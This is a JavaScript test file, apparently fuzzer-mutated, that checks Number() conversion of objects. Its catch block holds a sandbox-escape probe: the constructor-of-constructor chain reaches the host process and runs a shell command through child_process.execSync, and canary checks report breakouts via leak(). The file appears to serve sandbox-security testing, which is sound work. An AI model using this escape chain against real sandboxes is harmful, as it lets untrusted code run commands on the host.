try {
    var object = {
        valueOf: function () {
            let REPLACER = 23;
            return '1';
        },
        toString: function () {
            let REPLACER = 23;
            return 0;
        }
    };
    if (Number(object) !== 1) {
        $ERROR('#1: var object = {valueOf: function() {return "1"}, toString: function() {return 0}}; Number(object) === 1. Actual: ' + Number(object));
    }
    var object = {
        valueOf: function () {
            let REPLACER = 23;
            return {};
        },
        toString: function () {
            throw () => {
                return () => {
                };
            };
            return '0';
        }
    };
    if (Number(object) !== 0) {
        $ERROR('#2: var object = {valueOf: function() {return {}}, toString: function() {return "0"}}; Number(object) === 0. Actual: ' + Number(object));
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}